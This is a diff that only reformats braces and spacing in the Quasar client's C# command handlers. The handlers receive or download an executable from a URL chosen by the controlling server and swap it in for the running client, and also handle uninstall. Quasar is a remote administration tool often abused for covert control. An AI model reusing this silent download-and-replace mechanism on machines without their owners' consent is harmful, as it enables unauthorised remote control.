@@ -7,23 +7,18 @@ using System;
 using System.Net;
 using System.Threading;
 
-namespace Quasar.Client.Commands
-{
+namespace Quasar.Client.Commands {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE CONNECTION COMMANDS. */
-    public static partial class CommandHandler
-    {
-        public static void HandleDoClientUpdate(DoClientUpdate command, Networking.Client client)
-        {
+    public static partial class CommandHandler {
+        public static void HandleDoClientUpdate(DoClientUpdate command, Networking.Client client) {
             // i dont like this updating... if anyone has a better idea feel free to edit it
-            if (string.IsNullOrEmpty(command.DownloadUrl))
-            {
+            if (string.IsNullOrEmpty(command.DownloadUrl)) {
                 if (!_renamedFiles.ContainsKey(command.Id))
                     _renamedFiles.Add(command.Id, FileHelper.GetTempFilePath(".exe"));
 
                 string filePath = _renamedFiles[command.Id];
 
-                try
-                {
+                try {
                     if (command.CurrentBlock == 0 && !FileHelper.HasExecutableIdentifier(command.Block))
                         throw new Exception("No executable file");
 
@@ -36,50 +31,42 @@ namespace Quasar.Client.Commands
                     {
                         if (_renamedFiles.ContainsKey(command.Id))
                             _renamedFiles.Remove(command.Id);
-                        client.Send(new SetStatus {Message = "Updating..."});
+                        client.Send(new SetStatus { Message = "Updating..." });
                         ClientUpdater.Update(client, filePath);
                     }
-                }
-                catch (Exception ex)
-                {
+                } catch (Exception ex) {
                     if (_renamedFiles.ContainsKey(command.Id))
                         _renamedFiles.Remove(command.Id);
                     NativeMethods.DeleteFile(filePath);
-                    client.Send(new SetStatus {Message = $"Update failed: {ex.Message}"});
+                    client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
                 }
 
                 return;
             }
 
-            new Thread(() =>
-            {
+            new Thread(() => {
                 client.Send(new SetStatus { Message = "Downloading file..." });
 
                 string tempFile = FileHelper.GetTempFilePath(".exe");
 
-                try
-                {
-                    using (WebClient c = new WebClient())
-                    {
+                try {
+                    using (WebClient c = new WebClient()) {
                         c.Proxy = null;
                         c.DownloadFile(command.DownloadUrl, tempFile);
                     }
-                }
-                catch
-                {
-                    client.Send(new SetStatus {Message = "Download failed!"});
+                } catch {
+                    client.Send(new SetStatus { Message = "Download failed!" });
                     return;
                 }
 
-                client.Send(new SetStatus {Message = "Replacing executable..."});
+                client.Send(new SetStatus { Message = "Replacing executable..." });
 
                 ClientUpdater.Update(client, tempFile);
             }).Start();
         }
 
-        public static void HandleDoClientUninstall(DoClientUninstall command, Networking.Client client)
-        {
-            client.Send(new SetStatus {Message = "Uninstalling... good bye :-("});
+        public static void HandleDoClientUninstall(DoClientUninstall command, Networking.Client client) {
+            client.Send(new SetStatus { Message = "Uninstalling... good bye :-(" });
 
             ClientUninstaller.Uninstall(client);
         }
